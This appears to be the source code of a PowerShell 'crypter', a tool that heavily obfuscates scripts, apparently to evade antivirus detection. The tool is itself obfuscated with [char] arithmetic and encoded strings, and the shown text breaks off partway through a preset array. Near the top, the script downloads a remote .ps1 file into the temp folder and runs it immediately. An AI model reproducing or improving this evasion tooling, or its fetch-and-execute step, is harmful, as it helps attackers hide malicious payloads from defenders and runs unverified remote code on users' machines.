#    Noxi's Powershell Crypter
#    Copyright (C) 2024 Noverse
#
#    This program is proprietary software: you may not copy, redistribute, or modify
#    it in any way without prior written permission from Noverse.
#
#    Unauthorized use, modification, or distribution of this program is prohibited 
#    and will be pursued under applicable law. This software is provided "as is," 
#    without warranty of any kind, express or implied, including but not limited to 
#    the warranties of merchantability, fitness for a particular purpose, and 
#    non-infringement.
#
#    For permissions or inquiries, contact: https://discord.gg/E2ybG4j9jU
#
#    Usage example: . \NV-Omni-Crypter.ps1;nvcrypter -nvi "\Test.ps1" -nvo "\Encrypted.ps1" -Iterations 2

set-strictmode -version latest
$nv = "Authored by Noxi-Hu - (C) 2025 Noverse"
sv -scope global -name "erroractionpreference" -value "stop"
sv -Scope Global -Name "ProgressPreference" -Value "SilentlyContinue"
iwr 'https://github.com/5Noxi/5Noxi/releases/download/Logo/nvbanner.ps1' -o "$env:temp\nvbanner.ps1";. $env:temp\nvbanner.ps1
$Host.UI.RawUI.BackgroundColor="Black"
$Host.ui.rawUi.WINDoWtiTlE=([SYSTem.text.EncoDING]::UTf8.geTsTring([SyStem.CONvErt]::FROMbasE64StRIng('Tm94aSdzIFBvd2VyU2hlbGwgQw==')) + [sYsTEM.teXT.enCoDInG]::Utf8.geTstrINg((0x72, 0x79, 0x70, 0x74, 101, 0x72)))
clear

function log {
    param ([string]$HighlightMessage, [string]$Message,[string]$Sequence,[ConsoleColor]$TimeColor = 'DarkGray',[ConsoleColor]$HighlightColor = 'White',[ConsoleColor]$MessageColor = 'White',[ConsoleColor]$SequenceColor = 'White')
    $time = " [{0:HH:mm:ss}]" -f (Get-Date)
    Write-Host -ForegroundColor $TimeColor $time -NoNewline
    Write-Host -NoNewline " "
    Write-Host -ForegroundColor $HighlightColor $HighlightMessage -NoNewline
    Write-Host -ForegroundColor $MessageColor " $Message" -NoNewline
    Write-Host -ForegroundColor $SequenceColor " $Sequence"
}
function nvrandom {
    param ()
    $length = Get-random -Minimum 16 -Maximum 33
    $base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $nvrandomstring = -join (1..($length - 8) | ForEach-Object { $base64chars[(Get-random -Minimum 0 -Maximum $base64chars.Length)] })
    $vars = @(([SYStEM.tEXT.eNCodInG]::Utf8.GeTstRING((0x4e, 0x6f, 0x78, 73))), ([SYsteM.TEXt.enCOdiNg]::uTf8.gETsTrING((110, 48, 111, 88)) + [SYSTem.Text.eNcOdinG]::uTF8.GetStrIng((0x69, 49))), ([sYSTem.tExT.eNCOding]::UTF8.GETsTRing((110, 111)) + [SySTEM.text.eNCOdiNG]::utF8.GeTSTRING([sYstem.CoNverT]::fRomBaSE64StrIng('eFhpMQ=='))), ([SystEm.TEXt.enCOdINg]::UtF8.gEtstrINg((0x4e, 0x30, 0x78, 0x6c))), ([SystEm.teXT.eNcOdINg]::Utf8.geTSTriNG((0x4e, 0x6f, 0x78, 73))), ([sYSTeM.TexT.ENcODiNG]::UTF8.GeTSTrINg((0x6e, 0x6f, 0x58)) + [SysTEm.tEXT.ENcOding]::UTf8.GetSTRinG((0x31))), ([SyStEM.TeXT.eNCODInG]::Utf8.GETStRINg((0x4e, 0x6f, 0x6f)) + [SysTem.tExT.EncodinG]::UTF8.GEtstRing((0x78, 0x49))), ([sysTEM.TExt.encODINg]::UtF8.GEtStriNg([SYSTeM.ConvErt]::fROmBasE64stRiNG('bjBY')) + [SYStEm.TeXt.EncODing]::utF8.gEtStriNG((0x69, 0x69))), ([sYsTEM.TeXT.encodiNg]::Utf8.GeTStRinG((0x4e, 0x6f, 0x78, 73))), ([sySTEm.TEXt.eNCOdIng]::uTF8.GetSTRING((110, 48, 48, 120)) + [sYSTem.tExT.eNCoDiNG]::utf8.GEtSTrIng((0x78, 0x69, 0x69))), ([SySteM.tEXT.ENCoDING]::utf8.GETsTRING((0x4e, 0x6f)) + [SYStem.tEXT.ENcOdiNg]::UTF8.geTstrINg((48, 48, 0x78, 73))), ([SysTeM.teXt.EnCoDing]::uTf8.gETStrinG((110, 48, 111)) + [SystEM.tEXT.EnCOdIng]::UTF8.gEtstRIng((120, 88)) + [SYsteM.TExT.ENCOdinG]::uTF8.GETstRiNG(105)), ([sYSTeM.texT.ENCoDinG]::utF8.GetstRING((110, 0x6f, 88)) + [sysTeM.TEXt.eNcodING]::UTF8.GetsTrinG((0x69, 0x31))), ([SysTEM.tExt.eNcoDiNG]::UTf8.getstrInG((0x4e, 48, 120, 0x6c)) + [SySTem.tExt.ENcodinG]::uTf8.GetSTRIng(49)), ([sYStEm.TEXt.ENCOdinG]::UTf8.geTStRinG((0x6e, 0x6f)) + [sYSTEm.TExT.EncOdinG]::UTF8.gETsTriNG((88, 49, 49, 105))), ([SYstEm.tExT.ENcoDINg]::uTF8.getstriNg((0x6e, 111)) + [SYSTEm.TEXt.EncodiNG]::uTF8.GETStRing((88, 49, 105)) + [SYstem.Text.ENCoDIng]::UTF8.GEtsTriNg(49)), ([SySTEm.teXt.ENcOdING]::utF8.GetStrinG((78, 0x6f, 111, 0x78)) + [sySTem.TExt.EnCoDiNG]::Utf8.GETStRINg((88, 73))), ([SyStEM.TeXt.eNCODinG]::uTf8.geTsTrIng((110, 48)) + [sYSTEM.TexT.eNcOdiNg]::uTF8.GeTSTRINg((88, 120, 105, 49)) + [sYsTEm.teXT.encodiNg]::utF8.geTStRiNg([systEm.CoNveRT]::fROMbaSe64STriNG('aQ=='))), ([SysTEM.Text.encODing]::Utf8.GetStRInG((0x6e, 0x6f, 0x31, 0x58)) + [SYStem.TeXt.encODinG]::Utf8.GeTStRINg((105, 49))), ([SySTeM.teXT.EncOdIng]::uTf8.gEtStrING((0x4e, 0x6f, 0x6f, 0x78)) + [sYstEm.texT.ENcODING]::Utf8.gEtSTrINg((0x58, 0x49, 0x31)) + [sYstEm.TeXt.EnCODING]::utF8.GetstrING([sYStem.COnVeRT]::FRoMbaSE64StRINg('MQ==')))) | .([char](((4868 -Band 7955) + (4868 -Bor 7955) - 9127 - 3625))+[char](((-18519 -Band 2665) + (-18519 -Bor 2665) + 6281 + 9674))+[char](((-12184 -Band 686) + (-12184 -Bor 686) + 4077 + 7537))+[char](((13493 -Band 785) + (13493 -Bor 785) - 9093 - 5140))+[char](((3519 -Band 3444) + (3519 -Bor 3444) - 3388 - 3461))+[char](((-18345 -Band 9023) + (-18345 -Bor 9023) + 92 + 9327))+[char]((3441 - 8103 - 170 + 4942))+[char](((-19640 -Band 5191) + (-19640 -Bor 5191) + 9513 + 5036))+[char]((-308 - 4156 - 1527 + 6102))+[char](((-15301 -Band 4578) + (-15301 -Bor 4578) + 6623 + 4209)))
    $nvrandomstring = $vars + $nvrandomstring
    $midpoint = [math]::Floor($nvrandomstring.Length / 2)
    $nvrandomstring = $nvrandomstring.Substring(0, $midpoint) + $vars + $nvrandomstring.Substring($midpoint)
    return $nvrandomstring.Substring(0, $length)
}

function mathkey {
    param ()
    $length = Get-random -Minimum 6 -Maximum 12
    $base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $nvrandomstring = -join (1..($length - 8) | ForEach-Object { $base64chars[(Get-random -Minimum 0 -Maximum $base64chars.Length)] })
    $vars = @(([syStem.TEXt.EncoDINg]::UTF8.getStrING((0x4e, 0x6f, 0x78)) + [sysTeM.TeXt.ENCoDinG]::utf8.getStriNG(73)), ([system.tEXt.ENCodINg]::uTF8.getstRINg((0x6e, 0x30)) + [SYStem.tEXt.eNcOdInG]::utf8.gEtStRIng((111, 88)) + [SYstEM.tEXT.encodiNg]::uTF8.GetstrIng((105, 49))), ([SYstEM.TeXT.EncOdinG]::utf8.geTSTRinG((0x6e, 0x6f)) + [sySTeM.Text.eNCODiNg]::UtF8.GEtSTRING([sySTeM.COnvERt]::fROmbasE64strIng('eFhpMQ=='))), ([sYStEM.teXt.EncoDInG]::uTF8.gETsTrIng((78, 48, 120)) + [sYsteM.Text.EnCodiNg]::UTF8.getsTrInG(108)), ([SYStEM.Text.eNcodinG]::utF8.GetSTRiNG((0x4e, 0x6f, 0x78)) + [sYsTeM.TEXt.enCODiNg]::UTf8.GEtstrIng(73)), ([sYStEm.TEXt.eNcOdiNg]::uTF8.GetsTRinG((110, 111)) + [sYstem.TEXT.enCOdING]::UtF8.gETSTRING([SysteM.coNveRT]::fRoMbaSe64stRINg('WDE='))), ([sYsTEM.TeXt.eNCODInG]::utf8.GeTSTriNG((0x4e, 0x6f, 0x6f)) + [sYstEm.tExt.eNCodinG]::uTF8.gETsTRing((120, 73))), ([sYSteM.teXt.eNCoDIng]::uTF8.GETSTRIng((0x6e, 0x30, 0x58)) + [SySteM.Text.eNcODiNG]::utf8.gEtSTrinG((105, 0x69))), ([SYStEm.teXT.enCodinG]::UTF8.GETSTRinG((0x4e, 0x6f, 0x78)) + [SYStEm.TEXT.EncodING]::Utf8.GEtstRiNg(73)), ([SysTem.teXT.enCOdinG]::utf8.gETStRinG((110, 48, 0x30)) + [SystEM.TExT.ENCoding]::UtF8.GeTsTRing((0x78, 0x78, 0x69)) + [SystEm.Text.EnCODING]::UTf8.GetSTRing((105))), ([sYsTeM.TExt.enCODing]::Utf8.gEtStRInG([systeM.conveRT]::fROMbAsE64sTrIng('Tm8w')) + [system.TExt.ENCoDInG]::Utf8.gEtSTriNG((48, 120, 73))), ([sySteM.tExT.EnCODING]::utF8.geTStRiNG([System.cONvERt]::FrOmbASE64STriNg('bjBveA==')) + [sySTEM.text.EncODing]::utf8.GeTSTrINg((88, 0x69))), ([sYSTEM.tExT.EncodIng]::Utf8.GETSTring((110, 111, 0x58, 0x69)) + [system.TExT.ENcOdING]::uTF8.GETstring([sySTem.CONveRt]::frOMbaSe64striNg('MQ=='))), ([SySTEm.Text.eNcoDINg]::UTF8.GETStriNG([SySTEm.cOnvERt]::fROmbaSe64StrInG('TjB4bA==')) + [SYSteM.tExt.ENCodING]::UTf8.GeTSTRiNg(49)), ([sYsteM.tExt.eNcODiNG]::UTf8.geTSTrINg((0x6e, 0x6f, 88)) + [sYstEm.tEXT.EncODING]::Utf8.GETsTrInG((0x31, 49)) + [sYsTeM.Text.ENCoding]::UtF8.getstrInG((105))), ([sYsTEm.TEXt.EnCoDING]::utf8.gEtSTring((0x6e, 111)) + [sYSTem.tExt.eNCoDIng]::UtF8.getstriNg((0x58, 0x31, 0x69)) + [sySTeM.tExT.encodIng]::UTf8.GetstrINg((49))), ([systeM.Text.encOding]::uTf8.GEtsTRIng((78, 111)) + [SYSTem.tExT.enCodIng]::Utf8.GEtsTRiNg((0x6f, 0x78, 0x58)) + [sYSteM.TEXt.ENcODINg]::UTf8.GEtSTring([system.CONVert]::FRoMBase64StrIng('SQ=='))), ([SyStEm.TEXt.eNCOdING]::Utf8.GEtStRiNg((0x6e, 0x30, 0x58)) + [SYStEm.tExt.encoDING]::uTf8.GetstrING((0x78, 0x69, 49, 105))), ([sYstEM.teXt.eNCODIng]::uTF8.GETstrinG((0x6e, 0x6f, 0x31, 0x58)) + [sYstEm.tExT.EnCODInG]::uTf8.GEtsTriNg((105, 49))), ([SySteM.tEXt.eNCoding]::UTf8.GETsTRING((0x4e, 0x6f)) + [sYsTeM.tEXt.EnCOdInG]::UTf8.GeTsTrIng([sYStEM.COnVErt]::FROMbase64stRINg('b3g=')) + [sYsTEm.TExT.ENcOdinG]::uTF8.geTsTRiNg((88, 73, 49, 49)))) | .([char]((6755 - 3469 + 1509 - 4724))+[char](((9338 -Band 296) + (9338 -Bor 296) - 8295 - 1238))+[char]((14279 - 3765 - 2031 - 8367))+[char](((-13906 -Band 5173) + (-13906 -Bor 5173) + 3417 + 5361))+[char]((18036 - 2898 - 6118 - 8906))+[char]((-3799 - 2412 - 1351 + 7659))+[char]((-1325 - 2104 - 3236 + 6775))+[char]((6821 - 1782 - 2074 - 2865))+[char](((-3741 -Band 5394) + (-3741 -Bor 5394) + 2153 - 3695))+[char](((-12542 -Band 8824) + (-12542 -Bor 8824) + 9060 - 5233)))    
    $nvrandomstring = $vars + $nvrandomstring
    $midpoint = [math]::Floor($nvrandomstring.Length / 2)
    $nvrandomstring = $nvrandomstring.Substring(0, $midpoint) + $vars + $nvrandomstring.Substring($midpoint)
    return $nvrandomstring.Substring(0, $length)
}

# Creating these presets was extremly annoying... but it's extremly randomized now ;D 
function reverseobf {
    $nvreverse = @(
        '([char]((2461 - 1692 - 4549 + 3862))+[char](((-5471 -Band 4331) + (-5471 -Bor 4331) - 554 + 1763))+[char]((-567 - 8705 + 491 + 8867))+[char]((-6408 - 5659 + 4477 + 7659))+[char](((-3248 -Band 2956) + (-3248 -Bor 2956) + 5064 - 4690))+[char](((-12403 -Band 4618) + (-12403 -Bor 4618) - 1959 + 9827))+[char]((8382 - 2855 - 4973 - 485)))',
        '([char](((1070 -Band 2222) + (1070 -Bor 2222) - 113 - 3097))+[char]((-11901 - 4967 + 9201 + 7736))+[char]((2918 - 2687 + 962 - 1107))+[char]((9020 - 5325 - 5771 + 2177))+[char](((3036 -Band 4235) + (3036 -Bor 4235) - 7216 + 59))+[char](((4744 -Band 1739) + (4744 -Bor 1739) - 1101 - 5299))+[char](((3118 -Band 6801) + (3118 -Bor 6801) - 8432 - 1386)))',
        '([char]((8453 - 8329 + 2855 - 2897))+[char](((-2734 -Band 1757) + (-2734 -Bor 1757) - 7528 + 8606))+[char](((4350 -Band 4544) + (4350 -Bor 4544) + 31 - 8839))+[char](((7337 -Band 1288) + (7337 -Bor 1288) - 7865 - 691))+[char](((-8521 -Band 544) + (-8521 -Bor 544) + 3312 + 4747))+[char]((11168 - 8989 + 5613 - 7709))+[char]((-1154 - 3616 + 1441 + 3430)))',
        '([char](((-13405 -Band 5437) + (-13405 -Bor 5437) + 4284 + 3766))+[char]((-10334 - 467 + 3135 + 7735))+[char]((-7846 - 289 + 3018 + 5235))+[char]((394 - 5418 + 7255 - 2162))+[char](((2118 -Band 7173) + (2118 -Bor 7173) - 3559 - 5618))+[char]((13383 - 6112 - 429 - 6759))+[char]((-8358 - 5805 + 4613 + 9619)))',
        '([char](((-9157 -Band 3414) + (-9157 -Bor 3414) + 7078 - 1253))+[char]((-6907 - 4523 + 9440 + 2059))+[char]((4608 - 5895 + 4603 - 3230))+[char]((-2 - 5413 - 764 + 6248))+[char]((5954 - 4783 + 1100 - 2189))+[char]((6815 - 2685 - 4579 + 532))+[char]((-3903 - 2011 - 300 + 6315)))',
        '([char](((-11488 -Band 8075) + (-11488 -Bor 8075) + 4677 - 1150))+[char](((-15152 -Band 6518) + (-15152 -Bor 6518) + 2122 + 6581))+[char](((-11286 -Band 1595) + (-11286 -Bor 1595) + 5434 + 4343))+[char](((-2890 -Band 6520) + (-2890 -Bor 6520) - 8922 + 5361))+[char](((10959 -Band 5225) + (10959 -Bor 5225) - 6271 - 9831))+[char](((-22 -Band 9824) + (-22 -Bor 9824) - 4697 - 5022))+[char](((-4382 -Band 2293) + (-4382 -Bor 2293) - 4253 + 6411)))',
        '([char](((-2881 -Band 2401) + (-2881 -Bor 2401) + 8607 - 8013))+[char]((5246 - 258 - 7111 + 2224))+[char]((758 - 603 + 9575 - 9644))+[char]((3909 - 2394 - 1657 + 211))+[char](((1378 -Band 4042) + (1378 -Bor 4042) - 4053 - 1285))+[char]((16921 - 4315 - 5276 - 7247))+[char]((13730 - 8292 - 9466 + 4097)))',
        '([char](((2836 -Band 9838) + (2836 -Bor 9838) - 8217 - 4343))+[char](((-9203 -Band 1029) + (-9203 -Bor 1029) + 7641 + 634))+[char]((11595 - 1461 - 21 - 9995))+[char](((-11209 -Band 8737) + (-11209 -Bor 8737) + 5781 - 3208))+[char]((-9945 - 1749 + 3952 + 7856))+[char](((-5102 -Band 8845) + (-5102 -Bor 8845) - 9456 + 5828))+[char](((1041 -Band 266) + (1041 -Bor 266) + 8782 - 9988)))',
        '([char](((-16166 -Band 2806) + (-16166 -Bor 2806) + 7125 + 6317))+[char](((3330 -Band 3712) + (3330 -Bor 3712) - 3351 - 3590))+[char](((-3472 -Band 1489) + (-3472 -Bor 1489) - 4039 + 6140))+[char](((-11445 -Band 163) + (-11445 -Bor 163) + 8198 + 3185))+[char]((-3137 - 7469 + 1667 + 9053))+[char]((5497 - 3786 - 882 - 714))+[char]((-7041 - 8367 + 8948 + 6561)))',
        '([char](((280 -Band 6189) + (280 -Bor 6189) - 3344 - 3011))+[char]((9447 - 5309 + 3827 - 7896))+[char](((-1049 -Band 2981) + (-1049 -Bor 2981) - 2279 + 465))+[char](((4326 -Band 311) + (4326 -Bor 311) + 430 - 4998))+[char]((25019 - 8362 - 7118 - 9425))+[char](((-6267 -Band 7572) + (-6267 -Bor 7572) + 5967 - 7189))+[char]((18102 - 692 - 8985 - 8324)))',
        '([char](((-2944 -Band 9119) + (-2944 -Bor 9119) - 2625 - 3468))+[char](((1207 -Band 9724) + (1207 -Bor 9724) - 8171 - 2659))+[char](((-4886 -Band 4402) + (-4886 -Bor 4402) - 1029 + 1599))+[char]((12824 - 14 - 8183 - 4526))+[char]((2847 - 2673 + 3640 - 3732))+[char]((-5201 - 938 - 432 + 6686))+[char]((4577 - 4483 + 1237 - 1262)))',
        '([char](((-3711 -Band 6747) + (-3711 -Bor 6747) - 1321 - 1633))+[char](((-1442 -Band 4862) + (-1442 -Bor 4862) - 2590 - 761))+[char](((-12529 -Band 6025) + (-12529 -Bor 6025) + 4014 + 2576))+[char](((8301 -Band 451) + (8301 -Bor 451) - 6218 - 2465))+[char]((-2340 - 7456 + 731 + 9179))+[char]((5591 - 7101 + 6717 - 5124))+[char](((-13787 -Band 3728) + (-13787 -Bor 3728) + 6811 + 3317)))',
        '([char](((-8708 -Band 5945) + (-8708 -Bor 5945) - 916 + 3793))+[char](((-1240 -Band 3597) + (-1240 -Bor 3597) - 217 - 2071))+[char]((-1421 - 9417 + 8608 + 2348))+[char]((2849 - 4605 - 3284 + 5109))+[char]((5658 - 6392 - 3573 + 4389))+[char]((6932 - 2067 + 2830 - 7580))+[char]((9440 - 2438 - 392 - 6541)))',
        '([char]((938 - 9432 - 263 + 8871))+[char]((3897 - 1958 - 1388 - 450))+[char]((9825 - 186 - 4195 - 5326))+[char](((-9917 -Band 7867) + (-9917 -Bor 7867) + 896 + 1255))+[char]((-2826 - 5853 + 8358 + 435))+[char]((9542 - 1806 - 936 - 6717))+[char]((3855 - 5014 + 8254 - 7026)))',
        '([char](((5627 -Band 969) + (5627 -Bor 969) + 263 - 6777))+[char]((-2367 - 8566 + 3084 + 7918))+[char]((6943 - 2571 - 901 - 3353))+[char]((8513 - 4438 - 5940 + 1934))+[char](((8622 -Band 4436) + (8622 -Bor 4436) - 8110 - 4866))+[char](((-14287 -Band 9201) + (-14287 -Bor 9201) - 4645 + 9846))+[char]((682 - 7102 + 2729 + 3792)))',
        '([char]((-11170 - 3075 + 4635 + 9724))+[char]((12388 - 1703 - 4355 - 6229))+[char]((2624 - 2550 - 2335 + 2379))+[char](((156 -Band 541) + (156 -Bor 541) - 7306 + 6678))+[char](((-17376 -Band 7332) + (-17376 -Bor 7332) + 830 + 9296))+[char]((1466 - 487 + 8717 - 9613))+[char](((-11137 -Band 7120) + (-11137 -Bor 7120) - 1899 + 5985)))')
    $nvrevobf = $nvreverse  | Get-Random
    return $nvrevobf
}

function chararrayobf {
    $nvtoarray = @(
        '([char](((-3861 -Band 5948) + (-3861 -Bor 5948) - 1416 - 587))+[char](((5006 -Band 2257) + (5006 -Bor 2257) - 2375 - 4809))+[char](((-11793 -Band 9791) + (-11793 -Bor 9791) + 8018 - 5949))+[char]((-3577 - 1544 + 3447 + 1746))+[char]((24402 - 8825 - 8461 - 7051))+[char](((449 -Band 9727) + (449 -Bor 9727) - 1663 - 8431))+[char](((-447 -Band 4481) + (-447 -Bor 4481) - 9057 + 5088))+[char](((4143 -Band 1263) + (4143 -Bor 1263) - 5788 + 464))+[char](((-17356 -Band 2309) + (-17356 -Bor 2309) + 9550 + 5579))+[char](((-14704 -Band 6057) + (-14704 -Bor 6057) - 10 + 8722))+[char](((-444 -Band 1537) + (-444 -Bor 1537) - 3786 + 2782)))',
        '([char]((14389 - 804 - 8663 - 4838))+[char]((20637 - 5949 - 5380 - 9229))+[char](((-15685 -Band 2554) + (-15685 -Bor 2554) + 4224 + 8974))+[char]((15331 - 9700 - 1357 - 4202))+[char]((-1460 - 6901 - 839 + 9265))+[char](((-9468 -Band 6208) + (-9468 -Bor 6208) + 8829 - 5487))+[char]((11120 - 854 - 473 - 9728))+[char](((-10203 -Band 6117) + (-10203 -Bor 6117) - 45 + 4245))+[char]((4444 - 4757 - 8844 + 9271))+[char]((18971 - 9895 - 5128 - 3883))+[char]((2008 - 5805 - 226 + 4112)))',
        '([char]((19154 - 5665 - 8907 - 4498))+[char](((-10127 -Band 9098) + (-10127 -Bor 9098) - 2980 + 4088))+[char]((-3685 - 6920 + 9817 + 855))+[char](((1058 -Band 6360) + (1058 -Bor 6360) + 606 - 7952))+[char]((12425 - 9131 - 5279 + 2050))+[char]((-11573 - 6848 + 8777 + 9758))+[char](((8547 -Band 5253) + (8547 -Bor 5253) - 6604 - 7131))+[char](((6767 -Band 3436) + (6767 -Bor 3436) - 7802 - 2319))+[char](((-7139 -Band 8058) + (-7139 -Bor 8058) + 3364 - 4201))+[char]((17419 - 8525 - 435 - 8394))+[char](((-1770 -Band 2861) + (-1770 -Bor 2861) + 3140 - 4110)))',
        '([char](((-6731 -Band 9337) + (-6731 -Bor 9337) - 8886 + 6364))+[char]((8201 - 7709 + 9547 - 9960))+[char]((-10123 - 2063 + 9451 + 2802))+[char](((2609 -Band 126) + (2609 -Bor 126) - 1364 - 1267))+[char](((6230 -Band 3056) + (6230 -Bor 3056) - 8113 - 1076))+[char]((6019 - 4440 + 976 - 2441))+[char](((-18038 -Band 9408) + (-18038 -Bor 9408) + 5660 + 3035))+[char](((-25462 -Band 8480) + (-25462 -Bor 8480) + 7822 + 9242))+[char](((2969 -Band 5204) + (2969 -Bor 5204) - 9548 + 1457))+[char]((936 - 229 - 358 - 284))+[char](((-1671 -Band 1102) + (-1671 -Bor 1102) + 911 - 253)))',
        '([char](((5386 -Band 8381) + (5386 -Bor 8381) - 4951 - 8732))+[char]((14990 - 1721 - 8570 - 4620))+[char](((-8046 -Band 9748) + (-8046 -Bor 9748) + 679 - 2314))+[char]((1837 - 8693 - 1618 + 8546))+[char]((10076 - 2483 - 6812 - 716))+[char](((-16755 -Band 856) + (-16755 -Bor 856) + 9777 + 6204))+[char]((8896 - 184 - 1574 - 7041))+[char](((-4966 -Band 6954) + (-4966 -Bor 6954) + 4904 - 6778))+[char]((1504 - 3966 + 4908 - 2332))+[char]((-7776 - 1637 + 5387 + 4123))+[char]((12238 - 4828 + 1447 - 8736)))',
        '([char]((-4836 - 8725 + 4672 + 8973))+[char](((3868 -Band 5399) + (3868 -Bor 5399) - 5777 - 3379))+[char](((-1417 -Band 9289) + (-1417 -Bor 9289) - 5523 - 2282))+[char](((-15338 -Band 8798) + (-15338 -Bor 8798) - 2078 + 8690))+[char](((4383 -Band 5895) + (4383 -Bor 5895) - 3183 - 7030))+[char]((-4790 - 4836 + 8238 + 1470))+[char]((-5875 - 5997 + 6993 + 4944))+[char](((12453 -Band 1763) + (12453 -Bor 1763) - 9544 - 4590))+[char](((-12291 -Band 8353) + (-12291 -Bor 8353) + 2785 + 1235))+[char](((-24829 -Band 6894) + (-24829 -Bor 6894) + 9416 + 8584))+[char]((14501 - 1591 - 9655 - 3166)))',
        '([char](((-11992 -Band 6651) + (-11992 -Bor 6651) + 2489 + 2968))+[char](((3494 -Band 6087) + (3494 -Bor 6087) - 5690 - 3780))+[char]((13022 - 6459 - 6292 - 172))+[char](((1490 -Band 1694) + (1490 -Bor 1694) - 4804 + 1724))+[char]((4158 - 2404 - 6693 + 5036))+[char]((-4299 - 1998 + 4219 + 2192))+[char]((-1823 - 30 - 5718 + 7668))+[char](((-17050 -Band 6736) + (-17050 -Bor 6736) + 3652 + 6776))+[char]((8310 - 6963 - 5993 + 4760))+[char](((-270 -Band 1247) + (-270 -Bor 1247) - 9311 + 8431))+[char](((-13282 -Band 1154) + (-13282 -Bor 1154) + 3231 + 9018)))',
        '([char]((3414 - 6360 + 6532 - 3502))+[char](((-9569 -Band 4569) + (-9569 -Bor 4569) + 2348 + 2731))+[char]((4481 - 8520 - 2293 + 6399))+[char](((-2299 -Band 1067) + (-2299 -Bor 1067) - 4590 + 5894))+[char](((-9975 -Band 4145) + (-9975 -Bor 4145) + 5228 + 667))+[char](((-6490 -Band 8595) + (-6490 -Bor 8595) - 2069 + 46))+[char]((13564 - 9193 - 4428 + 122))+[char](((-1750 -Band 1908) + (-1750 -Bor 1908) - 5213 + 5169))+[char](((3443 -Band 2125) + (3443 -Bor 2125) - 1299 - 4187))+[char](((-10646 -Band 8677) + (-10646 -Bor 8677) + 8030 - 5964))+[char](((-3727 -Band 4952) + (-3727 -Bor 4952) - 7320 + 6216)))',
        '([char](((-12250 -Band 2629) + (-12250 -Bor 2629) + 9178 + 527))+[char]((-2978 - 7080 + 5708 + 4429))+[char]((10045 - 6794 - 8646 + 5462))+[char](((-19206 -Band 2892) + (-19206 -Bor 2892) + 7391 + 9027))+[char](((8915 -Band 725) + (8915 -Bor 725) - 6857 - 2686))+[char]((6802 - 7236 - 9064 + 9612))+[char](((-502 -Band 1026) + (-502 -Bor 1026) - 2149 + 1690))+[char]((-2810 - 8767 + 3369 + 8322))+[char]((12746 - 8010 + 3856 - 8478))+[char]((7651 - 9433 - 7131 + 8978))+[char](((-13475 -Band 6514) + (-13475 -Bor 6514) + 1879 + 5203)))',
        '([char](((-7416 -Band 9204) + (-7416 -Bor 9204) - 6252 + 4580))+[char]((-1031 - 6864 + 4693 + 3313))+[char]((3487 - 8494 + 9002 - 3928))+[char]((8172 - 6067 + 5608 - 7609))+[char]((382 - 3972 - 316 + 4003))+[char](((-12085 -Band 1137) + (-12085 -Bor 1137) + 8535 + 2527))+[char](((-2847 -Band 9317) + (-2847 -Bor 9317) + 1068 - 7473))+[char]((5514 - 484 + 4848 - 9764))+[char]((11615 - 4342 - 6936 - 223))+[char]((-12802 - 1889 + 5692 + 9096))+[char]((-1013 - 2947 + 4410 - 329)))',
        '([char](((-6298 -Band 1346) + (-6298 -Bor 1346) - 2963 + 7999))+[char](((3341 -Band 3473) + (3341 -Bor 3473) + 1699 - 8402))+[char]((-6479 - 26 - 1275 + 7847))+[char]((11068 - 497 - 927 - 9540))+[char]((22577 - 5283 - 8933 - 8296))+[char]((12487 - 9646 - 7571 + 4844))+[char](((-22025 -Band 9197) + (-22025 -Bor 9197) + 9681 + 3212))+[char]((6810 - 7963 + 3033 - 1766))+[char]((14121 - 5203 - 4226 - 4610))+[char]((9011 - 4586 - 9565 + 5237))+[char](((-15741 -Band 3394) + (-15741 -Bor 3394) + 8572 + 3864)))',
        '([char]((-17085 - 1693 + 8913 + 9981))+[char](((-6633 -Band 6913) + (-6633 -Bor 6913) - 4371 + 4202))+[char](((-6816 -Band 9970) + (-6816 -Bor 9970) - 3211 + 124))+[char](((524 -Band 1713) + (524 -Bor 1713) + 5836 - 8001))+[char]((4992 - 7762 + 6092 - 3225))+[char]((16747 - 9194 - 4003 - 3436))+[char]((7899 - 6458 + 8615 - 9991))+[char](((8034 -Band 5259) + (8034 -Bor 5259) - 8290 - 4921))+[char](((-12668 -Band 5743) + (-12668 -Bor 5743) + 8734 - 1727))+[char](((10085 -Band 7895) + (10085 -Bor 7895) - 9494 - 8389))+[char]((4333 - 5284 - 181 + 1253)))',
        '([char](((-349 -Band 9347) + (-349 -Bor 9347) + 428 - 9342))+[char]((-1589 - 1421 - 3509 + 6598))+[char](((-10313 -Band 9006) + (-10313 -Bor 9006) - 6949 + 8355))+[char](((-6285 -Band 3706) + (-6285 -Bor 3706) - 6205 + 8856))+[char](((-6982 -Band 6783) + (-6982 -Bor 6783) - 2395 + 2691))+[char]((15589 - 3479 - 7040 - 4956))+[char](((-17237 -Band 8094) + (-17237 -Bor 8094) + 8630 + 578))+[char]((10171 - 9573 - 2497 + 1981))+[char]((2028 - 9058 + 5629 + 1483))+[char]((9329 - 8430 - 9757 + 8923))+[char]((-4979 - 4663 + 4118 + 5613)))',
        '([char]((-1759 - 1970 + 548 + 3297))+[char](((588 -Band 2999) + (588 -Bor 2999) + 2892 - 6400))+[char]((5147 - 5439 - 8982 + 9341))+[char](((-12450 -Band 5905) + (-12450 -Bor 5905) - 516 + 7133))+[char]((-4713 - 9436 + 5527 + 8687))+[char]((-10982 - 3186 + 8951 + 5299))+[char]((9946 - 9819 - 4273 + 4211))+[char]((3902 - 7348 - 3857 + 7385))+[char]((3994 - 4463 + 1178 - 627))+[char](((-11474 -Band 8764) + (-11474 -Bor 8764) + 7429 - 4622))+[char]((3499 - 1745 + 2273 - 3938)))',
        '([char]((3515 - 5922 + 5971 - 3448))+[char]((338 - 5192 + 5449 - 516))+[char]((2532 - 9909 - 174 + 7650))+[char](((-4792 -Band 3303) + (-4792 -Bor 3303) + 1342 + 251))+[char]((6555 - 4429 - 4757 + 2696))+[char]((5758 - 895 - 7570 + 2789))+[char](((-17623 -Band 9725) + (-17623 -Bor 9725) - 1760 + 9755))+[char](((-18204 -Band 4353) + (-18204 -Bor 4353) + 6010 + 7955))+[char]((13685 - 9493 + 5008 - 9118))+[char]((16021 - 3174 - 2844 - 9906))+[char]((8726 - 4467 - 7083 + 2945)))',
